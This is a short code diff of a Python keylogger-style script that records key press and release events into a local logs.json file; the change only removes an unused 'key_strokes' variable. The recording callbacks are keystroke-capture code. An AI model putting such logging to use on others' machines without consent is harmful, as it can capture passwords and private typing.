@@ -3,7 +3,6 @@ import json
 
 key_list = []
 x=False
-key_strokes=""
 
 def update_json_file(key_list):
     with open('logs.json', '+wb') as key_log:
@@ -24,7 +23,7 @@ def on_press(key):
         update_json_file(key_list)
 
 def on_release(key):
-    global x, key_list, key_strokes
+    global x, key_list
     key_list.append(
         {'Released': f'{key}'}
     )
